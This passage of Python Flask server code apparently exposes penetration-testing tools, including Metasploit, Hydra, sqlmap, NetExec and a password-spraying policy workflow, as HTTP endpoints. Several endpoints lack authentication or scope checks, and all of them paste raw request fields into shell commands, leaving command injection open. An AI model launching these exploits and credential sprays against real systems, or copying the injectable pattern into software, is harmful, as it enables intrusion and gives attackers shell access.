        logger.error(f"💥 Error in docker-bench-security endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/clair", methods=["POST"])
def clair():
    """Execute Clair for container vulnerability analysis"""
    try:
        params = request.json
        image = params.get("image", "")
        config = params.get("config", "/etc/clair/config.yaml")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not image:
            logger.warning("🐳 Clair called without image parameter")
            return jsonify({"error": "Image parameter is required"}), 400

        # Use clairctl for scanning
        command = f"clairctl analyze {image}"

        if config:
            command += f" --config {config}"

        if output_format:
            command += f" --format {output_format}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🐳 Starting Clair vulnerability scan: {image}")
        result = execute_command(command)
        logger.info(f"📊 Clair scan completed for {image}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in clair endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/falco", methods=["POST"])
def falco():
    """Execute Falco for runtime security monitoring"""
    try:
        params = request.json
        config_file = params.get("config_file", "/etc/falco/falco.yaml")
        rules_file = params.get("rules_file", "")
        output_format = params.get("output_format", "json")
        duration = params.get("duration", 60)  # seconds
        additional_args = params.get("additional_args", "")

        command = f"timeout {duration} falco"

        if config_file:
            command += f" --config {config_file}"

        if rules_file:
            command += f" --rules {rules_file}"

        if output_format == "json":
            command += " --json"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🛡️  Starting Falco runtime monitoring for {duration}s")
        result = execute_command(command)
        logger.info(f"📊 Falco monitoring completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in falco endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/checkov", methods=["POST"])
def checkov():
    """Execute Checkov for infrastructure as code security scanning"""
    try:
        params = request.json
        directory = params.get("directory", ".")
        framework = params.get("framework", "")  # terraform, cloudformation, kubernetes, etc.
        check = params.get("check", "")
        skip_check = params.get("skip_check", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        command = f"checkov -d {directory}"

        if framework:
            command += f" --framework {framework}"

        if check:
            command += f" --check {check}"

        if skip_check:
            command += f" --skip-check {skip_check}"

        if output_format:
            command += f" --output {output_format}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Checkov IaC scan: {directory}")
        result = execute_command(command)
        logger.info(f"📊 Checkov scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in checkov endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/terrascan", methods=["POST"])
def terrascan():
    """Execute Terrascan for infrastructure as code security scanning"""
    try:
        params = request.json
        scan_type = params.get("scan_type", "all")  # all, terraform, k8s, etc.
        iac_dir = params.get("iac_dir", ".")
        policy_type = params.get("policy_type", "")
        output_format = params.get("output_format", "json")
        severity = params.get("severity", "")
        additional_args = params.get("additional_args", "")

        command = f"terrascan scan -t {scan_type} -d {iac_dir}"

        if policy_type:
            command += f" -p {policy_type}"

        if output_format:
            command += f" -o {output_format}"

        if severity:
            command += f" --severity {severity}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Terrascan IaC scan: {iac_dir}")
        result = execute_command(command)
        logger.info(f"📊 Terrascan scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in terrascan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/dirb", methods=["POST"])
def dirb():
    """Execute dirb with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Dirb called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"dirb {url} {wordlist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"📁 Starting Dirb scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Dirb scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dirb endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nikto", methods=["POST"])
def nikto():
    """Execute nikto with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Nikto called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"nikto -h {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔬 Starting Nikto scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 Nikto scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in nikto endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/sqlmap", methods=["POST"])
def sqlmap():
    """Execute sqlmap with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        data = params.get("data", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🎯 SQLMap called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"sqlmap -u {url} --batch"

        if data:
            command += f" --data=\"{data}\""

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"💉 Starting SQLMap scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 SQLMap scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in sqlmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/metasploit", methods=["POST"])
def metasploit():
    """Execute metasploit module with enhanced logging"""
    try:
        params = request.json
        module = params.get("module", "")
        options = params.get("options", {})

        if not module:
            logger.warning("🚀 Metasploit called without module parameter")
            return jsonify({
                "error": "Module parameter is required"
            }), 400

        # Create an MSF resource script
        resource_content = f"use {module}\n"
        for key, value in options.items():
            resource_content += f"set {key} {value}\n"
        resource_content += "exploit\n"

        # Save resource script to a temporary file
        resource_file = "/tmp/mcp_msf_resource.rc"
        with open(resource_file, "w") as f:
            f.write(resource_content)

        command = f"msfconsole -q -r {resource_file}"

        logger.info(f"🚀 Starting Metasploit module: {module}")
        result = execute_command(command)

        # Clean up the temporary file
        try:
            os.remove(resource_file)
        except Exception as e:
            logger.warning(f"Error removing temporary resource file: {str(e)}")

        logger.info(f"📊 Metasploit module completed: {module}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in metasploit endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hydra", methods=["POST"])
def hydra():
    """Execute hydra with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        service = params.get("service", "")
        username = params.get("username", "")
        username_file = params.get("username_file", "")
        password = params.get("password", "")
        password_file = params.get("password_file", "")
        additional_args = params.get("additional_args", "")

        if not target or not service:
            logger.warning("🎯 Hydra called without target or service parameter")
            return jsonify({
                "error": "Target and service parameters are required"
            }), 400

        if not (username or username_file) or not (password or password_file):
            logger.warning("🔑 Hydra called without username/password parameters")
            return jsonify({
                "error": "Username/username_file and password/password_file are required"
            }), 400

        command = f"hydra -t 4"

        if username:
            command += f" -l {username}"
        elif username_file:
            command += f" -L {username_file}"

        if password:
            command += f" -p {password}"
        elif password_file:
            command += f" -P {password_file}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {target} {service}"

        logger.info(f"🔑 Starting Hydra attack: {target}:{service}")
        result = execute_command(command)
        logger.info(f"📊 Hydra attack completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hydra endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/john", methods=["POST"])
def john():
    """Execute john with enhanced logging"""
    try:
        params = request.json
        hash_file = params.get("hash_file", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        format_type = params.get("format", "")
        additional_args = params.get("additional_args", "")

        if not hash_file:
            logger.warning("🔐 John called without hash_file parameter")
            return jsonify({
                "error": "Hash file parameter is required"
            }), 400

        command = f"john"

        if format_type:
            command += f" --format={format_type}"

        if wordlist:
            command += f" --wordlist={wordlist}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {hash_file}"

        logger.info(f"🔐 Starting John the Ripper: {hash_file}")
        result = execute_command(command)
        logger.info(f"📊 John the Ripper completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in john endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wpscan", methods=["POST"])
def wpscan():
    """Execute wpscan with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 WPScan called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"wpscan --url {url}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting WPScan: {url}")
        result = execute_command(command)
        logger.info(f"📊 WPScan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wpscan endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/enum4linux", methods=["POST"])
def enum4linux():
    """Execute enum4linux with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "-a")

        if not target:
            logger.warning("🎯 Enum4linux called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"enum4linux {additional_args} {target}"

        logger.info(f"🔍 Starting Enum4linux: {target}")
        result = execute_command(command)
        logger.info(f"📊 Enum4linux completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in enum4linux endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/ffuf", methods=["POST"])
@require_api_key
def ffuf():
    """
    ffuf — fast web fuzzer (v7.0).

    Modes:
      directory  — fuzz paths:            /FUZZ
      vhost      — fuzz virtual hosts:    Host: FUZZ.target.com
      parameter  — fuzz GET params:       ?FUZZ=value
      post-data  — fuzz POST body:        field=FUZZ
      header     — fuzz arbitrary header: X-Custom: FUZZ

    VHost mode tips:
      - Use a subdomain wordlist (e.g. /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt)
      - Filter by response size to eliminate false positives: filter_size="<baseline_size>"
      - The domain suffix is appended automatically: FUZZ.<domain>
    """
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        wordlist = sanitize_input(params.get("wordlist", "/usr/share/wordlists/dirb/common.txt"))
        mode = sanitize_input(params.get("mode", "directory"))
        match_codes = sanitize_input(params.get("match_codes", "200,204,301,302,307,401,403"))
        filter_codes = sanitize_input(params.get("filter_codes", ""))
        filter_size = sanitize_input(params.get("filter_size", ""))
        filter_words = sanitize_input(params.get("filter_words", ""))
        filter_lines = sanitize_input(params.get("filter_lines", ""))
        threads = int(params.get("threads", 40))
        timeout = int(params.get("timeout", 10))
        domain = sanitize_input(params.get("domain", ""))    # used in vhost mode: FUZZ.<domain>
        post_data = sanitize_input(params.get("post_data", ""))
        header_name = sanitize_input(params.get("header_name", ""))
        header_value_template = sanitize_input(params.get("header_value_template", "FUZZ"))
        follow_redirects = params.get("follow_redirects", False)
        json_output = params.get("json_output", False)
        output_file = sanitize_input(params.get("output_file", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))

        if not url:
            return jsonify({"error": "url is required"}), 400

        # Scope check on target host
        import urllib.parse
        parsed = urllib.parse.urlparse(url if "://" in url else f"http://{url}")
        scope_manager.validate_or_raise(parsed.hostname or url)

        # ── Build command by mode ────────────────────────────────────────
        command = f"ffuf -t {threads} -timeout {timeout}"

        if mode == "directory":
            command += f" -u {url}/FUZZ -w {wordlist}"

        elif mode == "vhost":
            # FUZZ.domain or just FUZZ if domain provided with Host header
            if domain:
                command += f" -u {url} -H 'Host: FUZZ.{domain}' -w {wordlist}"
            else:
                command += f" -u {url} -H 'Host: FUZZ' -w {wordlist}"

        elif mode == "parameter":
            command += f" -u {url}?FUZZ=value -w {wordlist}"

        elif mode == "post-data":
            if not post_data:
                return jsonify({"error": "post_data is required for mode=post-data (e.g. 'user=FUZZ&pass=test')"}), 400
            command += f" -u {url} -X POST -d '{post_data}' -w {wordlist}"

        elif mode == "header":
            if not header_name:
                return jsonify({"error": "header_name is required for mode=header"}), 400
            command += f" -u {url} -H '{header_name}: {header_value_template}' -w {wordlist}"

        else:
            return jsonify({"error": f"Unknown mode '{mode}'. Use: directory|vhost|parameter|post-data|header"}), 400

        # ── Filters and matchers ─────────────────────────────────────────
        command += f" -mc {match_codes}"
        if filter_codes:
            command += f" -fc {filter_codes}"
        if filter_size:
            command += f" -fs {filter_size}"
        if filter_words:
            command += f" -fw {filter_words}"
        if filter_lines:
            command += f" -fl {filter_lines}"
        if follow_redirects:
            command += " -r"
        if json_output or output_file:
            command += " -of json"
            if output_file:
                command += f" -o {output_file}"
        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 ffuf [{mode}] starting: {url}")
        result = execute_command_with_recovery("ffuf", command, params)

        # Parse discovered items from stdout
        discovered = []
        for line in result.get("stdout", "").splitlines():
            # ffuf output: [Status: 200, Size: 1234, Words: 45, Lines: 20] path
            m = re.search(r'\[Status:\s*(\d+),\s*Size:\s*(\d+),.*?\]\s*(.+)', line)
            if m:
                discovered.append({
                    "status": int(m.group(1)),
                    "size":   int(m.group(2)),
                    "result": m.group(3).strip()
                })

        result["mode"] = mode
        result["discovered"] = discovered
        result["discovered_count"] = len(discovered)

        logger.info(f"✅ ffuf [{mode}] done — {len(discovered)} results for {url}")
        return jsonify(result)

    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 ffuf error: {str(e)}")
        return jsonify({"error": str(e), "success": False}), 500

@app.route("/api/tools/netexec", methods=["POST"])
@require_api_key
def netexec():
    """Execute NetExec (nxc) — SMB/WinRM/LDAP/SSH/RDP/MSSQL/FTP lateral movement tool."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        protocol = sanitize_input(params.get("protocol", "smb"))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        hash_value = sanitize_input(params.get("hash", ""))
        domain = sanitize_input(params.get("domain", ""))
        module = sanitize_input(params.get("module", ""))
        shares = params.get("shares", False)
        sessions = params.get("sessions", False)
        users = params.get("users", False)
        groups = params.get("groups", False)
        local_auth = params.get("local_auth", False)
        additional_args = sanitize_input(params.get("additional_args", ""))

        if not target:
            return jsonify({"error": "target is required"}), 400

        scope_manager.validate_or_raise(target)

        command = f"nxc {protocol} {target}"
        if domain:
            command += f" -d {domain}"
        if username:
            command += f" -u '{username}'"
        if password:
            command += f" -p '{password}'"
        if hash_value:
            command += f" -H {hash_value}"
        if module:
            command += f" -M {module}"
        if shares:
            command += " --shares"
        if sessions:
            command += " --sessions"
        if users:
            command += " --users"
        if groups:
            command += " --groups"
        if local_auth:
            command += " --local-auth"
        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 NetExec [{protocol}]: {target}")
        result = execute_command_with_recovery("nxc", command, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 Error in netexec endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/amass", methods=["POST"])
def amass():
    """Execute Amass for subdomain enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        mode = params.get("mode", "enum")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Amass called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"amass {mode}"

        if mode == "enum":
            command += f" -d {domain}"
        else:
            command += f" -d {domain}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Amass {mode}: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Amass completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in amass endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hashcat", methods=["POST"])
def hashcat():
    """Execute Hashcat for password cracking with enhanced logging"""
    try:
        params = request.json
        hash_file = params.get("hash_file", "")
        hash_type = params.get("hash_type", "")
        attack_mode = params.get("attack_mode", "0")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        mask = params.get("mask", "")
        additional_args = params.get("additional_args", "")

        if not hash_file:
            logger.warning("🔐 Hashcat called without hash_file parameter")
            return jsonify({
                "error": "Hash file parameter is required"
            }), 400

        if not hash_type:
            logger.warning("🔐 Hashcat called without hash_type parameter")
            return jsonify({
                "error": "Hash type parameter is required"
            }), 400

        command = f"hashcat -m {hash_type} -a {attack_mode} {hash_file}"

        if attack_mode == "0" and wordlist:
            command += f" {wordlist}"
        elif attack_mode == "3" and mask:
            command += f" {mask}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔐 Starting Hashcat attack: mode {attack_mode}")
        result = execute_command(command)
        logger.info(f"📊 Hashcat attack completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hashcat endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/subfinder", methods=["POST"])
def subfinder():
    """Execute Subfinder for passive subdomain enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        silent = params.get("silent", True)
        all_sources = params.get("all_sources", False)
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Subfinder called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"subfinder -d {domain}"

        if silent:
            command += " -silent"

        if all_sources:
            command += " -all"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Subfinder: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Subfinder completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in subfinder endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/smbmap", methods=["POST"])
def smbmap():
    """Execute SMBMap for SMB share enumeration with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        domain = params.get("domain", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 SMBMap called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"smbmap -H {target}"

        if username:
            command += f" -u {username}"

        if password:
            command += f" -p {password}"

        if domain:
            command += f" -d {domain}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting SMBMap: {target}")
        result = execute_command(command)
        logger.info(f"📊 SMBMap completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in smbmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED NETWORK PENETRATION TESTING TOOLS (v6.0)
# ============================================================================

@app.route("/api/tools/rustscan", methods=["POST"])
@require_api_key
def rustscan():
    """Execute Rustscan for ultra-fast port scanning with enhanced logging"""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        ports = sanitize_input(params.get("ports", ""))
        ulimit = int(params.get("ulimit", 5000))
        batch_size = int(params.get("batch_size", 4500))
        timeout = int(params.get("timeout", 1500))
        scripts = params.get("scripts", False)
        greppable = params.get("greppable", False)
        additional_args = sanitize_input(params.get("additional_args", ""))

        if not target:
            return jsonify({"error": "target is required"}), 400

        scope_manager.validate_or_raise(target)

        command = f"rustscan -a {target} --ulimit {ulimit} -b {batch_size} -t {timeout}"

        if ports:
            command += f" -p {ports}"
        if greppable:
            command += " --greppable"
        if scripts:
            command += " -- -sC -sV"
        if additional_args:
            command += f" {additional_args}"

        logger.info(f"⚡ Rustscan: {target} (ulimit={ulimit}, batch={batch_size})")
        result = execute_command_with_recovery("rustscan", command, params)
        # Parse open ports from output for pipeline use
        result["open_ports"] = _parse_rustscan_ports(result.get("stdout", ""))
        logger.info(f"📊 Rustscan completed: {len(result['open_ports'])} open ports on {target}")
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 Error in rustscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

def _parse_rustscan_ports(output: str) -> List[int]:
    """
    Extract open port numbers from rustscan stdout.
    Handles both greppable format 'HOST -> [22, 80, 443]'
    and standard format 'Open HOST:PORT'.
    """
    ports: List[int] = []
    if not output:
        return ports

    # Greppable format: "192.168.1.1 -> [22, 80, 443]"
    greppable_match = re.search(r'->\s*\[([0-9, ]+)\]', output)
    if greppable_match:
        for p in greppable_match.group(1).split(','):
            p = p.strip()
            if p.isdigit():
                ports.append(int(p))
        return sorted(set(ports))

    # Standard format: "Open 192.168.1.1:80"
    for match in re.finditer(r'Open\s+[\w\.\:]+:(\d+)', output, re.IGNORECASE):
        ports.append(int(match.group(1)))

    # Also catch nmap passthrough lines like "22/tcp open ssh"
    for match in re.finditer(r'^(\d+)/tcp\s+open', output, re.MULTILINE):
        ports.append(int(match.group(1)))

    return sorted(set(ports))


# ============================================================================
# FAST SCAN PIPELINE — RustScan → Nmap (v7.0)
# ============================================================================

@app.route("/api/workflows/fast-scan", methods=["POST"])
@require_api_key
def fast_scan_pipeline():
    """
    Two-phase port scan pipeline:
      Phase 1 — RustScan: discovers ALL open ports in seconds (no service detection)
      Phase 2 — Nmap: runs -sV -sC only on discovered ports (accurate, focused)

    Much faster than a full nmap scan. Typical times:
      - RustScan full port range: 5–30s
      - Nmap on discovered ports:  30–120s
      - vs nmap -sV -p-:           10–60 min
    """
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        ulimit = int(params.get("ulimit", 5000))
        batch_size = int(params.get("batch_size", 4500))
        nmap_flags = sanitize_input(params.get("nmap_flags", "-sV -sC -T4 -Pn"))
        port_range = sanitize_input(params.get("port_range", ""))       # e.g. "1-65535" or "top-1000"
        nmap_scripts = sanitize_input(params.get("nmap_scripts", ""))   # e.g. "vuln" or "default,vuln"
        timeout_rs = int(params.get("rustscan_timeout", 1500))
        additional_nmap = sanitize_input(params.get("additional_nmap_args", ""))

        if not target:
            return jsonify({"error": "target is required"}), 400

        scope_manager.validate_or_raise(target)

        pipeline_start = time.time()
        result = {
            "target": target,
            "pipeline": "rustscan → nmap",
            "phases": {}
        }

        # ── Phase 1: RustScan ────────────────────────────────────────────
        logger.info(f"⚡ [Phase 1/2] RustScan: {target}")
        rs_cmd = f"rustscan -a {target} --ulimit {ulimit} -b {batch_size} -t {timeout_rs} --greppable"
        if port_range and not port_range.startswith("top"):
            rs_cmd += f" -p {port_range}"

        rs_result = execute_command_with_recovery("rustscan", rs_cmd, params)
        open_ports = _parse_rustscan_ports(rs_result.get("stdout", ""))

        result["phases"]["rustscan"] = {
            "success": rs_result.get("success", False),
            "open_ports": open_ports,
            "port_count": len(open_ports),
            "execution_time": rs_result.get("execution_time", 0),
            "stdout": rs_result.get("stdout", ""),
            "stderr": rs_result.get("stderr", "")
        }

        if not open_ports:
            logger.info(f"ℹ️  No open ports found on {target} — skipping nmap phase")
            result["success"] = True
            result["open_ports"] = []
            result["nmap_skipped"] = True
            result["total_time"] = round(time.time() - pipeline_start, 2)
            return jsonify(result)

        port_list = ",".join(str(p) for p in open_ports)
        logger.info(f"✅ [Phase 1/2] {len(open_ports)} open ports: {port_list}")

        # ── Phase 2: Nmap on discovered ports ───────────────────────────
        logger.info(f"🔍 [Phase 2/2] Nmap service detection on {len(open_ports)} ports")
        nm_cmd = f"nmap {nmap_flags} -p {port_list}"
        if nmap_scripts:
            nm_cmd += f" --script {nmap_scripts}"
        if additional_nmap:
            nm_cmd += f" {additional_nmap}"
        nm_cmd += f" {target}"

        nm_result = execute_command_with_recovery("nmap", nm_cmd, params)

        # Parse services from nmap output
        services = _parse_nmap_services(nm_result.get("stdout", ""))

        result["phases"]["nmap"] = {
            "success": nm_result.get("success", False),
            "command": nm_cmd,
            "execution_time": nm_result.get("execution_time", 0),
            "stdout": nm_result.get("stdout", ""),
            "stderr": nm_result.get("stderr", "")
        }

        result["success"] = nm_result.get("success", False)
        result["open_ports"] = open_ports
        result["services"] = services
        result["total_time"] = round(time.time() - pipeline_start, 2)

        logger.info(
            f"🏁 Fast scan complete: {target} | "
            f"{len(open_ports)} ports | {len(services)} services | "
            f"{result['total_time']}s total"
        )
        return jsonify(result)

    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 Fast scan pipeline error: {str(e)}")
        return jsonify({"error": str(e)}), 500


def _parse_nmap_services(output: str) -> List[Dict[str, Any]]:
    """
    Extract services from nmap stdout.
    Parses lines like: '22/tcp  open  ssh     OpenSSH 8.9p1'
    """
    services = []
    for line in output.splitlines():
        match = re.match(
            r'^(\d+)/(tcp|udp)\s+(open|filtered|closed)\s+(\S+)\s*(.*)?$',
            line.strip()
        )
        if match:
            services.append({
                "port":     int(match.group(1)),
                "protocol": match.group(2),
                "state":    match.group(3),
                "service":  match.group(4),
                "version":  match.group(5).strip() if match.group(5) else ""
            })
    return services


# ============================================================================
# PASSWORD POLICY EXTRACTION WORKFLOW (v7.0)
# ============================================================================

def _parse_password_policy(output: str) -> Dict[str, Any]:
    """
    Parse password policy from nxc/enum4linux-ng/rpcclient output.
    Returns structured dict with lockout threshold, min length, complexity, etc.
    """
    policy: Dict[str, Any] = {
        "min_password_length":     None,
        "password_complexity":     None,
        "lockout_threshold":       None,
        "lockout_duration_mins":   None,
        "lockout_observation_mins": None,
        "max_password_age_days":   None,
        "min_password_age_days":   None,
        "password_history_count":  None,
        "raw_lines":               []
    }

    for line in output.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        lower = stripped.lower()

        # nxc / enum4linux-ng style
        if "minimum password length" in lower:
            m = re.search(r'(\d+)', stripped)
            if m:
                policy["min_password_length"] = int(m.group(1))
        elif "password complexity" in lower or "complexity enabled" in lower:
            policy["password_complexity"] = "disabled" not in lower
        elif "lockout threshold" in lower or "account lockout threshold" in lower:
            m = re.search(r'(\d+)', stripped)
            if m:
                policy["lockout_threshold"] = int(m.group(1))
        elif "lockout duration" in lower:
            m = re.search(r'(\d+)', stripped)
            if m:
                policy["lockout_duration_mins"] = int(m.group(1))
        elif "lockout observation" in lower or "reset account lockout" in lower:
            m = re.search(r'(\d+)', stripped)
            if m:
                policy["lockout_observation_mins"] = int(m.group(1))
        elif "maximum password age" in lower:
            m = re.search(r'(\d+)', stripped)
            if m:
                policy["max_password_age_days"] = int(m.group(1))
        elif "minimum password age" in lower:
            m = re.search(r'(\d+)', stripped)
            if m:
                policy["min_password_age_days"] = int(m.group(1))
        elif "password history" in lower or "enforce password history" in lower:
            m = re.search(r'(\d+)', stripped)
            if m:
                policy["password_history_count"] = int(m.group(1))

        policy["raw_lines"].append(stripped)

    # Spray safety recommendation
    threshold = policy.get("lockout_threshold")
    if threshold is None:
        policy["spray_safe_attempts"] = None
        policy["spray_warning"] = "Lockout threshold unknown — enumerate policy before spraying"
    elif threshold == 0:
        policy["spray_safe_attempts"] = 999
        policy["spray_warning"] = None  # No lockout configured
    elif threshold <= 3:
        policy["spray_safe_attempts"] = max(1, threshold - 2)
        policy["spray_warning"] = (
            f"⚠️  DANGER: Lockout after {threshold} attempts — limit to 1 attempt per user per window"
        )
    else:
        # Leave 2-attempt buffer
        policy["spray_safe_attempts"] = threshold - 2
        policy["spray_warning"] = (
            f"⚡ Safe to spray {threshold - 2} attempts per window "
            f"(threshold={threshold}, buffer=2)"
        )

    return policy


@app.route("/api/workflows/password-policy", methods=["POST"])
@require_api_key
def get_password_policy():
    """
    Extract Active Directory / SMB password policy before credential spraying.

    Tries three methods in cascade (fastest to most verbose):
      1. nxc smb --pass-pol  (fastest, best format)
      2. enum4linux-ng -P    (fallback, very reliable)
      3. rpcclient getdompwinfo  (last resort, unauthenticated)

    Returns structured policy data plus spray safety recommendation.
    """
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        domain = sanitize_input(params.get("domain", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        hash_value = sanitize_input(params.get("hash", ""))
        null_session = params.get("null_session", True)   # try unauthenticated first

        if not target:
            return jsonify({"error": "target is required"}), 400

        scope_manager.validate_or_raise(target)

        results: Dict[str, Any] = {
            "target": target,
            "policy": None,
            "method_used": None,
            "methods_tried": [],
            "success": False
        }

        # ── Method 1: nxc smb --pass-pol ────────────────────────────────
        nxc_cmd = f"nxc smb {target} --pass-pol"
        if username and (password or hash_value):
            if hash_value:
                nxc_cmd += f" -u {username} -H {hash_value}"
            else:
                nxc_cmd += f" -u {username} -p {password}"
            if domain:
                nxc_cmd += f" -d {domain}"
        elif null_session:
            nxc_cmd += " -u '' -p ''"

        logger.info(f"🔑 [1/3] Extracting password policy via nxc: {target}")
        nxc_result = execute_command_with_recovery("nxc", nxc_cmd, params)
        results["methods_tried"].append({
            "method": "nxc",
            "command": nxc_cmd,
            "success": nxc_result.get("success", False),
            "stdout": nxc_result.get("stdout", ""),
            "stderr": nxc_result.get("stderr", "")
        })

        combined_nxc = nxc_result.get("stdout", "") + nxc_result.get("stderr", "")
        if nxc_result.get("success") and any(
